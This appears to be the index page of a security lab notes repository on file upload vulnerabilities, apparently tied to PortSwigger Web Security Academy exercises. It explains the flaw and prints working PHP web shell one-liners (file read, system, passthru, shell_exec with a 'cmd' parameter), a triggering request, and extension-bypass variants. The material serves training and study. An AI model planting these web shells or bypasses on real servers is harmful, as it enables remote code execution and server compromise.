#  File Upload Vulnerabilities
> **Technical analysis, weaponized payloads, and web shells used to compromise server-side file systems and execute arbitrary code.**

This section of the vault documents hands-on engineering labs targeting flaws within web server file upload mechanisms. The primary focus centers on identifying missing input validation patterns, bypassing extension blacklists, manipulating content types, and executing Remote Code Execution (RCE).

---

##  Core Vulnerability Mechanics

File upload vulnerabilities arise when a web server allows users to upload files to its filesystem without sufficiently validating characteristics such as their **name**, **type**, **contents**, or **size**. Failing to properly enforce restrictions can allow an attacker to upload arbitrary and potentially dangerous server-side script files (such as PHP, Java, or Python) and trigger their execution by the server.

###  Web Shell Exploitation Vector
From a security perspective, the worst-case scenario occurs when an application executes arbitrary commands via uploaded scripts. A web shell is a malicious script enabling an attacker to execute administrative actions by sending HTTP requests to the target endpoint.

*   **File Read One-Liner (PHP):**
    ```php
    <?php echo file_get_contents('/path/to/target/file'); ?>
    ```
*   **Command Execution Command String (PHP System Hook):**
    ```php
    <?php echo system($_GET['command']); ?>
    ```
    *Execution vector example via query parameters:*
    ```http
    GET /example/exploit.php?command=id HTTP/1.1
    ```

---

##  Laboratory Analysis Methodology

Every laboratory exercise documented within this directory follows a strict structural engineering checklist to preserve findings:

```text
├──  Objective        -> Defining restriction boundaries & flag targets
├──  Enumeration      -> Analyzing Content-Type headers, filenames, and validation rules
├──  Traffic Logs     -> Code-blocks isolating raw multipart/form-data payloads
├──  Exploitation    -> Step-by-step bypass walkthroughs (Null bytes, dual extensions, GIF magics)
└──  Remediation     -> Defensive architecture requirements to patch the file system
```

---

##  Core Payload Reference Library

A centralized repository of script components utilized across validation test scenarios:

| Script Extension | Objective Type | Payload Core String | Bypass Target Vector |
| :--- | :--- | :--- | :--- |
| `.php` | Command Execution | `<?php system($_GET['cmd']); ?>` | Unrestricted Execution |
| `.phtml` / `.php5` | Extension Spoofing | `<?php passthru($_GET['cmd']); ?>` | Blacklist Filter Bypass |
| `.jpg.php` | Double Extension | `<?php echo shell_exec($_GET['cmd']); ?>` | Weak Regex Validation |

---
*Disclaimer: All payloads, reverse shells, and system hooks documented within this directory are deployed solely within isolated sandboxed training environments provided by the PortSwigger Web Security Academy network.*
